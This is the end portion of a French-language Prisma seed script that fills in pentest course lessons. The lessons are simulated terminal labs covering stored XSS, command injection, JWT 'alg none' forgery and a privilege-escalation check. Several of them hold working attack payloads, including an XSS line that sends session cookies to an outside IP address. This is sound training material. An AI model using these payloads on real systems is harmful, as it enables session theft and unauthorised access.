      "command": "Invoke-WebRequest -Uri 'http://target.elsayf.local/comment.php' -Method POST -Body @{comment='<script>fetch(\\\"http://192.168.1.100:8080/?c=\\\"+document.cookie)</script>'}",
      "output": "StatusCode : 200\\nCommentaire avec payload XSS envoyé avec succès.",
      "explanation": "Injection d'un payload XSS Stored exfiltrant le cookie de session."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 5
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 5 },
            data: {
                content: `# Leçon 5 : OWASP Top 10 - Command Injection (RCE) & IDOR

## 💡 1. Execution de Commandes à Distance (RCE)

Les injections de commande surviennent lorsqu'un serveur passe une entrée utilisateur non filtrée au shell système.

---

## 🖥️ 2. Laboratoire Interactif 1 : Injection de Commandes RCE (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 5.1 — Injection de Commandes à Distance (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Invoke-RestMethod -Uri 'http://target.elsayf.local/ping.php?host=127.0.0.1%7Cwhoami'",
      "output": "nt authority\\\\system",
      "explanation": "Injection de la commande system 'whoami' via le séparateur pipe (|)."
    },
    {
      "command": "Invoke-RestMethod -Uri 'http://target.elsayf.local/ping.php?host=127.0.0.1%7Cdir%20C:\\\\Users\\\\Administrator'",
      "output": "Directory of C:\\\\Users\\\\Administrator\\nflag.txt",
      "explanation": "Consultation des fichiers administrateur à distance."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 6
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 6 },
            data: {
                content: `# Leçon 6 : Auditing d'APIs REST & Tokens JWT

## 💡 1. Sécurité des Jetons JWT (JSON Web Tokens)

Analyse de la signature et détection des failles 'Algorithm None' sur les jetons JWT.

---

## 🖥️ 2. Laboratoire Interactif 1 : Décodage & Usurpation de Token JWT (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 6.1 — Inspection & Manipulation de Token JWT (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python -c \"import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJTVFVERU5UIn0.xyz', options={'verify_signature': False}))\"",
      "output": "{'user': 'student', 'role': 'STUDENT'}",
      "explanation": "Décodage du payload d'un jeton JWT d'authentification."
    },
    {
      "command": "Invoke-RestMethod -Uri 'http://target.elsayf.local/api/admin/stats' -Headers @{Authorization='Bearer eyJhbGciOiJOb25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiQURNSU4ifQ.'}",
      "output": "StatusCode : 200\\nResponse   : {'success': True, 'message': 'Bienvenue Super Admin !'}",
      "explanation": "Exploitation de la vulnérabilité 'Algorithm None' pour obtenir l'accès Administrateur."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 7
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 7 },
            data: {
                content: `# Leçon 7 : Élévation de Privilèges (PrivEsc) & Scripting d'Exploits

## 💡 1. Élevation de Privilèges sous Windows & Linux

Audit des privilèges locaux pour identifier les failles d'élévation de droits.

---

## 🖥️ 2. Laboratoire Interactif 1 : Audit des Privilèges Utilisateur (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 7.1 — Audit whoami /priv & Privilèges Sensibles (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "whoami /priv",
      "output": "PRIVILEGES INFORMATION\\n----------------------\\nSeImpersonatePrivilege        Impersonate a client after auth      Enabled",
      "explanation": "Détection du privilège SeImpersonatePrivilege permettant une élévation de privilèges vers SYSTEM."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 8
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 8 },
            data: {
                content: `# Leçon 8 : Rédaction d'un Rapport d'Audit & Restitution Client

## 💡 1. Méthodologie de Rédaction du Rapport de Pentest

Compilation des vulnérabilités découvertes et recommandations de correctifs pour la direction et l'équipe technique.

---

## 🖥️ 2. Laboratoire Interactif 1 : Compilation Automatisée du Rapport PDF (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 8.1 — Génération du Rapport d'Audit Pentest PDF (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python generate_report.py --input audit_results.json --out Rapport_Pentest_ElSayf.pdf",
      "output": "[+] Lecture des vulnérabilités...\\n✅ Rapport PDF généré avec succès : Rapport_Pentest_ElSayf.pdf",
      "explanation": "Génération automatisée du document de restitution client."
    }
  ]
}
\`\`\`
`
            }
        })

        console.log('✅ Formation 2 enrichie avec succès !')
    }

    console.log('\n🎉 TOUTES les 16 leçons ont été enrichies de manière ultra-détaillée avec du code et des CyberTerminaux !')
}

main()
    .catch(e => {
        console.error('❌ Erreur :', e)
        process.exit(1)
    })
    .finally(async () => {
        await prisma.$disconnect()
    })
